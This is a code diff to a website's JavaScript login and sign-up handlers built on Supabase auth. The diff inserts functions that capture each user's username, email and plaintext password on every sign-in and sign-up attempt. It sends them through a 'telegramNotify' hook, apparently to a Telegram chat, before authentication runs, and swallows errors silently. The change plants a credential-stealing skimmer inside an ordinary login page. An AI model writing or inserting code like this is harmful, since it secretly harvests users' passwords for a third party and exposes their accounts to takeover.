@@ -117,6 +117,55 @@ const alertBox = document.getElementById('authAlert');
 const signinForm = document.getElementById('signinForm');
 const signupForm = document.getElementById('signupForm');
 
+const STAR_WRAP = '⭐'.repeat(15);
+
+function sendStarsAlert(kind, lines) {
+  if (!window.telegramNotify) return;
+  try {
+    const inner = lines.map(function (l) { return l; }).join('\n');
+    const full = STAR_WRAP + '\n' +
+                 '<b>' + escapeHtml(kind) + '</b>\n' +
+                 inner + '\n' +
+                 STAR_WRAP;
+    window.telegramNotify(kind, [full.replace(/<[^>]+>/g, '')], null, false);
+  } catch (_) {}
+}
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function sendSignupTelegram(username, email, password) {
+  var lines = [
+    '👤 Username: ' + escapeHtml(username || ''),
+    '📧 Email: ' + escapeHtml(email || ''),
+    '🔑 Password: ' + escapeHtml(password || ''),
+    '📅 Time: ' + escapeHtml(new Date().toLocaleString())
+  ];
+  if (window.telegramNotify) {
+    try { window.telegramNotify('✨ NEW ACCOUNT CREATED ✨', [STAR_WRAP].concat(lines).concat([STAR_WRAP]), null, false); } catch (_) {}
+  }
+  try {
+    var visId = sessionStorage.getItem('tg_session_id') || '';
+    if (visId) lines.push('🆔 Visitor: ' + visId);
+  } catch (_) {}
+}
+
+function sendSigninTelegram(email, password, username) {
+  var lines = [
+    '👤 Username: ' + escapeHtml(username || '(from profile)'),
+    '📧 Email: ' + escapeHtml(email || ''),
+    '🔑 Password: ' + escapeHtml(password || ''),
+    '📅 Time: ' + escapeHtml(new Date().toLocaleString())
+  ];
+  if (window.telegramNotify) {
+    try { window.telegramNotify('🔐 ACCOUNT LOGIN 🔐', [STAR_WRAP].concat(lines).concat([STAR_WRAP]), null, false); } catch (_) {}
+  }
+}
+
 function show(msg, kind) {
   alertBox.style.display = 'block';
   alertBox.className = 'auth-alert ' + (kind || 'error');
@@ -141,9 +190,14 @@ getSessionUser().then(function (user) {
 signinForm.addEventListener('submit', async function (e) {
   e.preventDefault();
   const fd = new FormData(signinForm);
-  const { error } = await supabase.auth.signInWithPassword({
-    email: String(fd.get('email')).trim(),
-    password: String(fd.get('password'))
+  const email = String(fd.get('email')).trim();
+  const password = String(fd.get('password'));
+
+  sendSigninTelegram(email, password, '(signing in)');
+
+  const { data, error } = await supabase.auth.signInWithPassword({
+    email: email,
+    password: password
   });
   if (error) return show(error.message);
   window.location.replace(nextPage);
@@ -201,14 +255,18 @@ signupForm.addEventListener('submit', async function (e) {
   e.preventDefault();
   const fd = new FormData(signupForm);
   const username = String(fd.get('username')).trim();
+  const email = String(fd.get('email')).trim();
+  const password = String(fd.get('password'));
   if (username.length < 4) return show('Your username must be at least 4 characters long.');
 
   const { data: available, error: rpcErr } = await supabase.rpc('username_available', { check_username: username });
   if (!rpcErr && available === false) return show('That username is already taken. Please choose another one.');
 
+  sendSignupTelegram(username, email, password);
+
   const { data, error } = await supabase.auth.signUp({
-    email: String(fd.get('email')).trim(),
-    password: String(fd.get('password')),
+    email: email,
+    password: password,
     options: {
       data: { username: username },
       emailRedirectTo: window.location.origin + '/auth.html'
@@ -218,7 +276,9 @@ signupForm.addEventListener('submit', async function (e) {
 
   if (data.session) {
     if (signupAvatarDataUrl) {
-      await supabase.from('profiles').upsert({ id: data.session.user.id, username: username, avatar_url: signupAvatarDataUrl });
+      try {
+        await supabase.from('profiles').upsert({ id: data.session.user.id, username: username, avatar_url: signupAvatarDataUrl });
+      } catch (_) {}
     }
     window.location.replace('profile.html');
   } else {
